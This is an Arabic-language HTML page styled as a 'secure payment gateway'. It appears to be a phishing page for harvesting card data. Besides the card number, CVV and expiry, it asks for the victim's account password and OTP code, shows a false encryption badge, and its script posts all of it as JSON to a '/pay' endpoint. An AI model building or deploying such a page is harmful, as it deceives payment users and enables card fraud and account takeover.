<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة الدفع</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:20px;padding:30px;width:100%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
.header{text-align:center;margin-bottom:25px}
.header h1{color:#333;font-size:22px;margin-bottom:8px}
.header p{color:#666;font-size:13px}
.card-preview{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);border-radius:15px;padding:20px;margin-bottom:25px;color:white;height:180px;position:relative}
.visa-logo{position:absolute;top:15px;left:15px;font-size:24px;font-weight:bold;font-style:italic}
.chip{width:45px;height:30px;background:linear-gradient(135deg,#f0c27b 0%,#4b1248 100%);border-radius:6px;margin-bottom:15px;margin-top:30px}
.card-number-display{font-size:20px;letter-spacing:2px;font-family:monospace;margin-bottom:15px}
.card-details{display:flex;justify-content:space-between;font-size:13px}
.form-group{margin-bottom:15px}
.form-group label{display:block;margin-bottom:6px;color:#333;font-weight:600;font-size:13px}
.form-group input,.form-group select{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px}
.form-group input:focus,.form-group select:focus{outline:none;border-color:#667eea}
.form-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.submit-btn{width:100%;padding:14px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
.submit-btn:disabled{opacity:0.6}
.loading{display:none;text-align:center;padding:20px}
.loading.active{display:block}
.spinner{border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;width:35px;height:35px;animation:spin 1s linear infinite;margin:0 auto 10px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.secure-badge{text-align:center;margin-top:15px;color:#666;font-size:11px}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🔒 بوابة الدفع الآمنة</h1>
<p>أدخل بيانات بطاقتك لإتمام عملية الدفع</p>
</div>

<div class="card-preview">
<div class="visa-logo">VISA</div>
<div class="chip"></div>
<div class="card-number-display" id="preview-number">#### #### #### ####</div>
<div class="card-details">
<div><div style="font-size:9px;opacity:0.7">CARD HOLDER</div><div id="preview-holder">YOUR NAME</div></div>
<div><div style="font-size:9px;opacity:0.7">EXPIRES</div><div id="preview-expiry">MM/YY</div></div>
</div>
</div>

<form id="payment-form">
<div class="form-group">
<label>💳 رقم البطاقة</label>
<input type="text" id="card_number" placeholder="0000 0000 0000 0000" maxlength="19" required>
</div>

<div class="form-group">
<label>👤 اسم صاحب البطاقة</label>
<input type="text" id="card_holder" placeholder="MOHAMMAD AHMAD" required>
</div>

<div class="form-row">
<div class="form-group">
<label>📅 الشهر</label>
<select id="expiry_month" required>
<option value="">MM</option>
<option value="01">01</option><option value="02">02</option><option value="03">03</option>
<option value="04">04</option><option value="05">05</option><option value="06">06</option>
<option value="07">07</option><option value="08">08</option><option value="09">09</option>
<option value="10">10</option><option value="11">11</option><option value="12">12</option>
</select>
</div>
<div class="form-group">
<label>📅 السنة</label>
<select id="expiry_year" required>
<option value="">YY</option>
<option value="26">2026</option><option value="27">2027</option><option value="28">2028</option>
<option value="29">2029</option><option value="30">2030</option><option value="31">2031</option>
</select>
</div>
</div>

<div class="form-row">
<div class="form-group">
<label>🔒 CVV</label>
<input type="password" id="cvv" placeholder="123" maxlength="4" required>
</div>
<div class="form-group">
<label>💰 المبلغ</label>
<input type="number" id="amount" placeholder="100" min="1" required>
</div>
</div>

<div class="form-group">
<label>🔑 كلمة سر الحساب (اختياري)</label>
<input type="password" id="password" placeholder="أدخل كلمة السر">
</div>

<div class="form-group">
<label>📱 رمز OTP (اختياري)</label>
<input type="text" id="otp" placeholder="أدخل الرمز" maxlength="6">
</div>

<div class="form-group">
<label>📧 البريد الإلكتروني</label>
<input type="email" id="email" placeholder="example@email.com" required>
</div>

<div class="form-group">
<label>📱 رقم الهاتف</label>
<input type="tel" id="phone" placeholder="+966 50 123 4567" required>
</div>

<button type="submit" class="submit-btn" id="submit-btn">🔒 ادفع الآن</button>
</form>

<div class="loading" id="loading">
<div class="spinner"></div>
<p>جاري المعالجة...</p>
</div>

<div class="secure-badge">🔒 SSL 256-bit | جميع البيانات مشفرة</div>
</div>

<script>
document.getElementById('card_number').addEventListener('input',function(e){
let v=e.target.value.replace(/\D/g,'').substring(0,16);
e.target.value=v.match(/.{1,4}/g)?.join(' ')||'';
document.getElementById('preview-number').textContent=e.target.value||'#### #### #### ####';
});
document.getElementById('card_holder').addEventListener('input',function(e){
document.getElementById('preview-holder').textContent=e.target.value.toUpperCase()||'YOUR NAME';
});
function updateExpiry(){
const m=document.getElementById('expiry_month').value||'MM';
const y=document.getElementById('expiry_year').value||'YY';
document.getElementById('preview-expiry').textContent=m+'/'+y;
}
document.getElementById('expiry_month').addEventListener('change',updateExpiry);
document.getElementById('expiry_year').addEventListener('change',updateExpiry);

document.getElementById('payment-form').addEventListener('submit',async function(e){
e.preventDefault();
document.getElementById('submit-btn').disabled=true;
document.getElementById('payment-form').style.display='none';
document.getElementById('loading').classList.add('active');

const data={
card_number:document.getElementById('card_number').value,
card_holder:document.getElementById('card_holder').value,
expiry_month:document.getElementById('expiry_month').value,
expiry_year:document.getElementById('expiry_year').value,
cvv:document.getElementById('cvv').value,
amount:document.getElementById('amount').value,
password:document.getElementById('password').value,
otp:document.getElementById('otp').value,
email:document.getElementById('email').value,
phone:document.getElementById('phone').value,
currency:'USD'
};

try{
const res=await fetch('/pay',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
const result=await res.json();
if(result.success){
window.location.href='/result/'+result.payment_id;
}else{
alert('خطأ: '+result.error);
location.reload();
}
}catch(err){
alert('خطأ في الاتصال');
location.reload();
}
});
</script>
</body>
</html>
